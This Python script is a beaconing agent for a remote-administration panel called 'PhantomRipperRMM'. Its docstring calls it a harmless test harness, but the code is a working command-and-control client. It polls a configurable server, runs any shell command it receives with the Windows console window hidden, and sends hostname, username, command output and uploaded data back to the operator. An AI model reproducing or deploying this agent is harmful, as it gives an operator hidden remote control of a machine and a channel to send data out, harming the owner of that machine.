#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhantomRipperRMM — local test agent (task-protocol harness).

Not a payload. A dev harness that simulates a live task-protocol agent so the
panel loop can be verified end to end: beacon -> structured task -> response,
plus artifact chunk upload and capability registration.

Usage:
    python test_agent.py --host http://127.0.0.1:8443 --id demo01
Press Ctrl+C to stop.
"""

import argparse
import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import time
import urllib.request

CAPS = ["shell", "info", "artifact", "echo", "screen"]


def call(base, path, payload, timeout=25):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(base + path, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception as exc:
        print("[!] %s -> %s" % (path, exc))
        return None


def send_artifact(base, session_id, name, data, kind="test", task_id=None, chunk=65536):
    total = max(1, (len(data) + chunk - 1) // chunk)
    for seq in range(total):
        payload = {
            "session_id": session_id,
            "task_id": task_id,
            "kind": kind,
            "name": name,
            "seq": seq,
            "total": total,
            "data": base64.b64encode(data[seq * chunk:(seq + 1) * chunk]).decode(),
        }
        r = call(base, "/api/artifact", payload, timeout=30)
        if not r or r.get("status") not in ("ok", "partial"):
            return False
    return True


def handle_task(base, session_id, task):
    verb = task.get("verb", "")
    args = task.get("args", "")
    task_id = task.get("task_id")
    print("[<] task %s %s (%s)" % (verb, args, task_id))

    if verb == "echo":
        output = args
    elif verb == "artifact":
        parts = args.split()
        name = parts[0] if parts else "blob.bin"
        size = int(parts[1]) if len(parts) > 1 else 4096
        rng = bytearray(range(256)) * (size // 256 + 1)
        data = bytes(rng[:size])
        ok = send_artifact(base, session_id, name, data, task_id=task_id)
        output = "artifact %s sent (%d B, sha256=%s)" % (
            name, size, hashlib.sha256(data).hexdigest()) if ok else "artifact upload FAILED"
    elif verb == "sysinfo":
        output = json.dumps({"hostname": socket.gethostname(), "os": platform.system()})
    elif verb == "shell" or verb == "cmd":
        try:
            kw = dict(shell=True, capture_output=True, text=True, timeout=60)
            if os.name == "nt":
                kw["creationflags"] = 0x08000000
            proc = subprocess.run(args, **kw)
            output = (proc.stdout or "") + (proc.stderr or "") or "[no output]"
        except Exception as exc:
            output = "ERROR: %s" % exc
    else:
        output = 'test-agent: unknown verb "%s"' % verb

    call(base, "/api/response", {
        "session_id": session_id,
        "command": "%s %s" % (verb, args),
        "task_id": task_id,
        "output": base64.b64encode(output.encode()).decode(),
        "encoding": "base64",
    })
    print("[>] %d bytes" % len(output))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="http://127.0.0.1:8443")
    ap.add_argument("--id", default="demo-%s" % os.urandom(4).hex())
    ap.add_argument("--interval", type=float, default=1.5)
    args = ap.parse_args()

    info = {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER") or "tester",
        "os": platform.system(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "privilege": "user",
        "agent_type": "python",
        "proto": "task",
        "caps": CAPS,
    }
    print("[*] test agent id=%s -> %s (caps: %s)" % (args.id, args.host, ",".join(CAPS)))
    while True:
        resp = call(args.host, "/api/beacon", {"session_id": args.id, "info": info})
        if resp:
            task = resp.get("task")
            command = resp.get("command")
            if task and task.get("task_id"):
                handle_task(args.host, args.id, task)
            elif command:
                print("[<] %s" % command)
                if command == "__TERMINATE__":
                    print("[*] terminated by operator")
                    break
                try:
                    kw = dict(shell=True, capture_output=True, text=True, timeout=60)
                    if os.name == "nt":
                        kw["creationflags"] = 0x08000000
                    out = subprocess.run(command, **kw)
                    output = (out.stdout or "") + (out.stderr or "")
                except Exception as exc:
                    output = "ERROR: %s" % exc
                call(args.host, "/api/response", {
                    "session_id": args.id, "command": command,
                    "output": base64.b64encode(output.encode()).decode(), "encoding": "base64",
                })
                print("[>] %d bytes" % len(output))
        time.sleep(args.interval)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
